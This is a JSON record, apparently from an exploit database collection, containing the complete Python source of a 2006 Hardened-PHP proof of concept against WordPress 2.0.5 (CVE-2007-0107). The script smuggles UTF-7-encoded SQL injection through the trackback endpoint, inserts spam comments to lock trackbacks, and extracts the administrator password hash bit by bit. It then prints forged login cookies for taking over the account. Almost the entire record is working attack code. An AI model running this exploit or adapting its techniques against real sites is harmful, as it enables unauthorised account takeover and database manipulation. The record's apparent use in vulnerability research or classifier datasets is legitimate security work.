{
  "id": "3095",
  "title": "WordPress Core 2.0.5 - Trackback UTF-7 SQL Injection",
  "cve": "CVE-2007-0107",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/python\r\n#######################################################################\r\n#  _  _                _                     _       ___  _  _  ___ \r\n# | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \\| || || _ \\\r\n# | __ |/ _` || '_|/ _` |/ -_)| ' \\ / -_)/ _` ||___||  _/| __ ||  _/\r\n# |_||_|\\__,_||_|  \\__,_|\\___||_||_|\\___|\\__,_|     |_|  |_||_||_|  \r\n#                                                        \r\n#######################################################################\r\n#         Proof of concept code from the Hardened-PHP Project \r\n#\r\n#                         NOT FOR DISTRIBUTION\r\n#                    PLEASE DO NOT SPREAD THIS CODE\r\n#\r\n#######################################################################\r\n#\r\n#                        -= Wordpress 2.0.5 =-\r\n#                Trackback UTF-7 SQL injection exploit\r\n#\r\n#                   beware of encoded single-quotes\r\n#\r\n#######################################################################\r\n\r\nimport urllib\r\nimport getopt\r\nimport sys\r\nimport string\r\nimport re\r\nimport time\r\nimport datetime\r\nimport md5\r\n\r\n__argv__ = sys.argv\r\n\r\ndef banner():\r\n    print \"Wordpress 2.0.5 - Trackback UTF-7 SQL injection exploit\"\r\n    print \"Copyright (C) 2006 Stefan Esser/Hardened-PHP Project\"\r\n    print \"            *** DO NOT DISTRIBUTE ***\\n\"\r\n\r\ndef usage():\r\n    banner()\r\n    print \"Usage:\\n\"\r\n    print \"   $ ./wordpressx.py [options]\\n\"\r\n    print \"        -h http_url   url of the Wordpress blog\"\r\n    print \"                      f.e. http://www.wordpress.org/development/\"\r\n    print \"        -p id         id of posting to exploit trackback (default: 1)\"\r\n    print \"        -i id         User id to steal password hash for(default: -1)\"\r\n    print \"        -u username   username to steal password hash for (default: ...)\"\r\n    print \"\"\r\n    sys.exit(-1)\r\n    \r\ndef determineCookieHash(host):\r\n\r\n    wclient = urllib.URLopener()\r\n    \r\n    print \"[+] Connecting to retrieve cookie hash\"\r\n    \r\n    try:\r\n        req = wclient.open(host + \"/wp-login.php?action=logout\")\r\n    except IOError, e:\r\n        if e[1] == 302:\r\n            # Got a 302 redirect, but check for cookies before redirecting.\r\n            # e[3] is a httplib.HTTPMessage instance.\r\n            if e[3].dict.has_key('set-cookie'):\r\n                cookie = e[3].dict['set-cookie'];\r\n                chash = cookie[string.find(cookie, \"user_\")+5:]\r\n                chash = chash[:string.find(chash, \"=\")]\r\n                print \"[+] Cookie hash found: %s\" % chash\r\n                return chash\r\n\r\n            \r\n    print \"[-] Unable to retrieve cookie... something is wrong\"\r\n    sys.exit(-3)\r\n    return \"\"\r\n    \r\ndef determineIsMbstringInstalled(host, pid):\r\n\r\n    wclient = urllib.URLopener()\r\n    \r\n    print \"[+] Connecting to check if mbstring is installed\"\r\n    \r\n    params = {\r\n        'charset' : 'UTF-7',\r\n\t    'title' : '+ADA-'\r\n    }\r\n    \r\n    try:\r\n        req = wclient.open(host + \"/wp-trackback.php?p=\" + pid, urllib.urlencode(params))\r\n    except IOError, e:\r\n        if e[1] == 302:\r\n            print \"[+] ext/mbstring is installed. continue with exploit\"\r\n            return 1\r\n    \r\n    content = req.read()\r\n    \r\n    if string.find(content, 'error>1</error>') != -1:\r\n        print \"[-] Illegal posting id choosen, test impossible\"\r\n        sys.exit(-2)\r\n            \r\n    print \"[-] ext/mbstring not installed... exploit not possible\"\r\n    sys.exit(-2)\r\n    return 0\r\n    \r\ndef determineTablePrefix(host, pid):\r\n\r\n    wclient = urllib.URLopener()\r\n    \r\n    print \"[+] Connecting to determine mysql table prefix\"\r\n    \r\n    params = {\r\n        'charset' : 'UTF-7',\r\n\t    'title' : 'None',\r\n        'url' : 'None',\r\n        'excerpt' : 'None',\r\n        'blog_name' : '+ACc-ILLEGAL'\r\n    }\r\n    \r\n    try:\r\n        req = wclient.open(host + \"/wp-trackback.php?p=\" + pid, urllib.urlencode(params))\r\n    except IOError, e:\r\n        if e[1] == 302:\r\n            print \"[-] Table prefix cannot be determined... exploit not possible\"\r\n            sys.exit(-2)\r\n            return \"\"\r\n    \r\n    content = req.read()\r\n    \r\n    f = re.search('FROM (.*)comments WHERE', content)\r\n    if f != None:\r\n        prefix = f.group(1)\r\n        print \"[+] Table prefix is: %s\" % prefix\r\n        return prefix\r\n    \r\n    print \"[-] Table prefix cannot be determined... exploit not possible\"\r\n    sys.exit(-2)\r\n    return \"\"\r\n\r\ndef lockTrackbacks(host, pid):\r\n\r\n    now = datetime.datetime.utcnow()\r\n    now = now.replace(microsecond = 0)\r\n    \r\n    future = now + datetime.timedelta(days=1)\r\n    future = future.replace(microsecond = 0)\r\n        \r\n    wclient = urllib.URLopener()\r\n    \r\n    print \"[+] Connecting to lock trackbacks\"\r\n    \r\n    author = \"Mark Mouse\"\r\n    author_email = \"mark@incidents.org\"\r\n    author_url = \"\"\r\n    author_ip = \"210.35.2.3\"\r\n    agent = \"Internet Explorer\"\r\n    futuredate = future.isoformat(' ')\r\n    futuredate_gmt = future.isoformat(' ')\r\n    date = now.isoformat(' ')\r\n    date_gmt = now.isoformat(' ')\r\n    \r\n    sql = \"%s','%s','%s','%s','%s','%s','','0','%s','comment','0','0'),('0', '', '', '', '', '%s', '%s', '', 'spam', '', 'comment', '0','0' ) /*\" % \\\r\n          ( author , author_email , author_url , author_ip , date , date_gmt , agent, futuredate, futuredate_gmt )\r\n    \r\n    sql = string.replace(sql, \"'\", \"+ACc-\")\r\n    \r\n    params = {\r\n        'charset' : 'UTF-7',\r\n\t    'title' : 'None',\r\n        'url' : 'None',\r\n        'excerpt' : 'None',\r\n        'blog_name' : sql\r\n    }\r\n    \r\n    try:\r\n        req = wclient.open(host + \"/wp-trackback.php?p=\" + pid, urllib.urlencode(params))\r\n    except IOError, e:\r\n        if e[1] == 302:\r\n            print \"[-] Table prefix cannot be determined... exploit not possible\"\r\n            sys.exit(-2)\r\n            return \"\"\r\n    \r\n    content = req.read()\r\n    \r\n    return \"\"\r\n\r\ndef checkUsername(host, pid, prefix, name, uid):\r\n\r\n    wclient = urllib.URLopener()\r\n    \r\n    print \"[+] Connecting to check if user %s is present\" % name\r\n    \r\n    if uid != -1:\r\n        sql = \"' AND 1=0) UNION SELECT 1 FROM %susers WHERE ID='%s' /*\" % (prefix, uid)\r\n    else:\r\n        sql = \"' AND 1=0) UNION SELECT 1 FROM %susers WHERE user_login='%s' /*\" % (prefix, name)\r\n    \r\n    sql = string.replace(sql, \"'\", \"+ACc-\")\r\n    \r\n    params = {\r\n        'charset' : 'UTF-7',\r\n\t    'title' : 'None',\r\n        'url' : 'None',\r\n        'excerpt' : 'None',\r\n        'blog_name' : sql\r\n    }\r\n    \r\n    req = wclient.open(host + \"/wp-trackback.php?p=\" + pid, urllib.urlencode(params))\r\n    \r\n    content = req.read()\r\n    \r\n    \r\n    if string.find(content, 'Duplicate') != -1:\r\n        return 1\r\n    if string.find(content, 'Doppelter') != -1:\r\n        return 1\r\n    \r\n    if uid != -1:\r\n        print \"[-] Error user_id invalid\"\r\n    else:\r\n        print \"[-] Error username invalid\"\r\n    sys.exit(-2)\r\n    return 0\r\n\r\n\r\ndef bruteforceBit(host, pid, prefix, name, uid, bit):\r\n\r\n    wclient = urllib.URLopener()\r\n        \r\n    nibble = (bit / 4) + 1 \r\n    bit = (bit % 4) + 1\r\n    \r\n    sql = \"' AND 1=0) UNION SELECT 1 FROM %susers WHERE \" % prefix\r\n    \r\n    if uid != -1:\r\n        sql = sql + \"ID='%s'\" % uid\r\n    else:\r\n        sql = sql + \"user_login='%s'\" % name\r\n    \r\n    sql = sql + \" and substring(reverse(lpad(conv(substring(user_pass, %d,1), 16, 2),4,'0')),%d,1)='1' /*\" % (nibble, bit)\r\n    \r\n    sql = string.replace(sql, \"'\", \"+ACc-\")\r\n    \r\n    params = {\r\n        'charset' : 'UTF-7',\r\n\t    'title' : 'None',\r\n        'url' : 'None',\r\n        'excerpt' : 'None',\r\n        'blog_name' : sql\r\n    }\r\n    \r\n    req = wclient.open(host + \"/wp-trackback.php?p=\" + pid, urllib.urlencode(params))\r\n    \r\n    content = req.read()\r\n    \r\n    if string.find(content, '15 seconds') != -1:\r\n        return 0\r\n    if string.find(content, '15 Sekunden') != -1:\r\n        return 0\r\n    if string.find(content, 'Duplicate') != -1:\r\n        return 1\r\n    if string.find(content, 'Doppelter') != -1:\r\n        return 1\r\n    \r\n    print \"[-] Error retrieving password hash: unexpected reply at bit %d\" % bit\r\n    sys.exit(-2)\r\n    return \"\"\r\n\r\ndef bruteforce(host, pid, prefix, name, uid):\r\n\r\n    phash = \"\"\r\n    \r\n    print \"[+] Retrieving the password hash bit by bit\"\r\n    \r\n    for i in range(32):\r\n        nibble = 0\r\n        for j in range(4):\r\n            nibble = nibble | (bruteforceBit(host, pid, prefix, name, uid, i*4+j) << j)\r\n        phash = phash + \"%x\" % nibble\r\n        \r\n    return phash\r\n        \r\n\r\ndef main():\r\n    try:\r\n        opts, args = getopt.getopt(sys.argv[1:], \"h:i:u:p:e:d:\")\r\n    except getopt.GetoptError:\r\n        usage()\r\n\r\n    if len(__argv__) < 2:\r\n        usage()\r\n        \r\n    username = 'admin'\r\n    password = None\r\n    email = None\r\n    domain = None\r\n    host = None\r\n    pid = 1\r\n    uid = -1\r\n    for o, arg in opts:\r\n        if o == \"-h\":\r\n\t        host = arg\r\n        if o == \"-p\":\r\n            pid = arg\r\n        if o == \"-i\":\r\n            uid = arg\r\n        if o == \"-u\":\r\n            username = arg\r\n        if o == \"-e\":\r\n            email = arg\r\n        if o == \"-d\":\r\n            domain = arg\r\n    \r\n    # Printout banner\r\n    banner()\r\n    \r\n    # Check if everything we need is there\r\n    if host == None:\r\n        print \"[-] need a host to connect to\"\r\n        sys.exit(-1)\r\n        \r\n#    if username == None:\r\n#        print \"[-] username needed to continue\"\r\n#        sys.exit(-1)\r\n#    if password == None:\r\n#        print \"[-] password needed to continue\"\r\n#        sys.exit(-1)\r\n#    if email == None:\r\n#        print \"[-] email address needed to continue\"\r\n#        sys.exit(-1)\r\n#    if domain == None:\r\n#        print \"[-] catch all domain needed to continue\"\r\n#\t    sys.exit(-1)\r\n\r\n    determineIsMbstringInstalled(host, pid)\r\n    chash = determineCookieHash(host)\r\n    lockTrackbacks(host, pid)\r\n    \r\n    prefix = determineTablePrefix(host, pid)\r\n    checkUsername(host, pid, prefix, username, uid)\r\n    \r\n    phash = bruteforce(host, pid, prefix, username, uid)\r\n    \r\n    print \"[+] Done...\"\r\n    print \"    The password hash is %s\" % phash\r\n    \r\n    m = md5.new()\r\n    m.update(phash)\r\n    cphash = m.hexdigest()\r\n    \r\n    print \"    The logincookies are:\"\r\n    print \"       wordpressuser_%s=%s\" % (chash, username)\r\n    print \"       wordpresspass_%s=%s\" % (chash, cphash)\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n\r\n# milw0rm.com [2007-01-07]",
  "url": "https://www.exploit-db.com/exploits/3095"
}